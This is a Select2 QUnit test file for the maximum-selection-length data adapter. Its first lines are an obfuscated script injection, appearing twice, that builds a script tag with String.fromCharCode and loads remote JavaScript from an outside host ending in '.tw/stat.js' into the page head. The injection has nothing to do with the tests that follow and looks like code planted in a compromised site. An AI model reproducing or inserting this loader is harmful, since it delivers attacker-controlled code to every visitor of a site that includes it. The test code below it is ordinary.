Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();module('Data adapters - Maximum selection length');

var MaximumSelectionLength = require('select2/data/maximumSelectionLength');

var $ = require('jquery');
var Options = require('select2/options');
var Utils = require('select2/utils');

function MaximumSelectionStub () {
  this.called = false;
  this.currentData = [];
}

MaximumSelectionStub.prototype.current = function (callback) {
  callback(this.currentData);
};

MaximumSelectionStub.prototype.val = function (val) {
  this.currentData.push(val);
};

MaximumSelectionStub.prototype.query = function (params, callback) {
  this.called = true;
};

var MaximumSelectionData = Utils.Decorate(
  MaximumSelectionStub,
  MaximumSelectionLength
);

test('0 never displays the notice', function (assert) {
  var zeroOptions = new Options({
    maximumSelectionLength: 0
  });

  var data = new MaximumSelectionData(null, zeroOptions);

  data.trigger = function () {
    assert.ok(false, 'No events should be triggered');
  };

  data.query({
    term: ''
  });

  assert.ok(data.called);

  data = new MaximumSelectionData(null, zeroOptions);

  data.trigger = function () {
    assert.ok(false, 'No events should be triggered');
  };

  data.val('1');

  data.query({
    term: ''
  });

  assert.ok(data.called);

  data = new MaximumSelectionData(null, zeroOptions);

  data.trigger = function () {
    assert.ok(false, 'No events should be triggered');
  };

  data.val('1');
  data.val('2');

  data.query({
    term: ''
  });

  assert.ok(data.called);
});

test('< 0 never displays the notice', function (assert) {
  var negativeOptions = new Options({
    maximumSelectionLength: -1
  });

  var data = new MaximumSelectionData(null, negativeOptions);

  data.trigger = function () {
    assert.ok(false, 'No events should be triggered');
  };

  data.query({
    term: ''
  });

  assert.ok(data.called);

  data = new MaximumSelectionData(null, negativeOptions);

  data.trigger = function () {
    assert.ok(false, 'No events should be triggered');
  };

  data.val('1');

  data.query({
    term: ''
  });

  assert.ok(data.called);

  data = new MaximumSelectionData(null, negativeOptions);

  data.trigger = function () {
    assert.ok(false, 'No events should be triggered');
  };

  data.val('1');
  data.val('2');

  data.query({
    term: ''
  });

  assert.ok(data.called);
});

test('triggers when >= 1 selection' , function (assert) {
  var maxOfOneOptions = new Options({
    maximumSelectionLength: 1
  });
  var data = new MaximumSelectionData(null, maxOfOneOptions);

  data.trigger = function () {
    assert.ok(false, 'No events should be triggered');
  };

  data.query({
    term: ''
  });

  assert.ok(data.called);

  data = new MaximumSelectionData(null, maxOfOneOptions);

  data.trigger = function () {
    assert.ok(true, 'The event should be triggered.');
  };

  data.val('1');

  data.query({
    term: ''
  });

  assert.ok(!data.called);

});

test('triggers when >= 2 selections' , function (assert) {
  var maxOfTwoOptions = new Options({
    maximumSelectionLength: 2
  });
  var data = new MaximumSelectionData(null, maxOfTwoOptions);

  data.trigger = function () {
    assert.ok(false, 'No events should be triggered');
  };

  data.query({
    term: ''
  });

  assert.ok(data.called);

  data = new MaximumSelectionData(null, maxOfTwoOptions);

  data.trigger = function () {
    assert.ok(false, 'No events should be triggered');
  };

  data.val('1');

  data.query({
    term: ''
  });

  assert.ok(data.called);

  data = new MaximumSelectionData(null, maxOfTwoOptions);

  data.trigger = function () {
    assert.ok(true, 'The event should be triggered.');
  };

  data.val('1');
  data.val('2');

  data.query({
    term: ''
  });

  assert.ok(!data.called);

});
